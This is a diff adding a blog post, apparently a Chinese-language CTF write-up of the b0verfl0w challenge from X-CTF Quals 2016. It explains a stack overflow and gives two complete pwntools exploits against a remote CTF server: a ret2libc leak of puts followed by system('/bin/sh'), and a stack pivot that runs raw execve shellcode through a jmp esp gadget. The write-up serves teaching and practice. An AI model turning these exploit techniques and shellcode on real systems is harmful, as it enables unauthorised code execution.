@@ -1,0 +1,142 @@
+---
+layout: post
+title:  b0verfl0w(X-CTF Quals 2016)
+date:   2022-09-22 00:08:01 +0300
+image:  2022-09-22-cat.jpg
+tags:   [ctf,pwn,ubuntu16,StackPivoting]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  return vul();
+}
+```
+
+vul
+
+```assembly
+int vul()
+{
+  char s[32]; // [esp+18h] [ebp-20h] BYREF
+
+  puts("\n======================");
+  puts("\nWelcome to X-CTF 2016!");
+  puts("\n======================");
+  puts("What's your name?");
+  fflush(stdout);
+  fgets(s, 0x32, stdin);
+  printf("Hello %s.", s);
+  fflush(stdout);
+  return 1;
+}
+```
+
+这里有一个栈溢出，按照之前的方法，先泄露地址，再执行system
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 26668)
+
+io.recvuntil("What's your name?\n")
+
+puts_plt = 0x80483D0
+puts_got = 0x804A018
+main = 0x804850E
+
+payload = "a"*32 + p32(0) + p32(puts_plt) + p32(main) + p32(puts_got)
+io.sendline(payload)
+
+io.recvuntil(".")
+
+addr = u32(io.recv(4))
+print(hex(addr))
+
+libc = LibcSearcher("puts", addr)
+base = addr - libc.dump("puts")
+system = base + libc.dump("system")
+bin_sh = base + libc.dump("str_bin_sh")
+
+
+io.recvuntil("What's your name?\n")
+payload = "a"*32 + p32(0) + p32(system) + p32(main) + p32(bin_sh)
+io.sendline(payload)
+
+
+# gdb.attach(io)
+# raw_input()
+
+io.interactive()
+```
+
+![]({{site.baseurl}}/img/2022-09-22-puts.jpg)
+
+但是这里还有另一种方法，栈劫持
+
+由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。
+
+- 利用栈溢出布置 shellcode
+- 控制 eip 指向 shellcode 处
+
+由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。
+
+```assembly
+ROPgadget --binary b0verfl0w --only 'jmp|ret'
+Gadgets information
+============================================================
+0x080483ab : jmp 0x8048390
+0x080484f2 : jmp 0x8048470
+0x08048611 : jmp 0x8048620
+0x0804855d : jmp dword ptr [ecx + 0x804a040]
+0x08048550 : jmp dword ptr [ecx + 0x804a060]
+0x0804876f : jmp dword ptr [ecx]
+0x08048504 : jmp esp
+0x0804836a : ret
+0x0804847e : ret 0xeac1
+
+Unique gadgets found: 9
+```
+
+发现有一个可以直接跳转到 esp 的 gadgets
+
+```assembly
+.text:08048504                 jmp     esp
+```
+
+- size(shellcode+padding)=0x20
+- size(fake ebp)=0x4
+- size(0x08048504)=0x4
+
+所以我们最后一段需要执行的指令就是
+
+```assembly
+sub esp,0x28
+jmp esp
+```
+
+exp
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 26668)
+
+shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode_x86 += "\x0b\xcd\x80"
+
+jmp_esp = 0x08048504
+sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
+
+payload = shellcode_x86 + (0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
+io.sendline(payload)
+
+io.interactive()
+```
+
+ret上写的是jump esp的地址，执行完ret之后会esp+4，指向了sub esp，0x28;jump esp，然后执行，esp又回到了shellcode的位置，然后jump esp；就执行了shellcode。
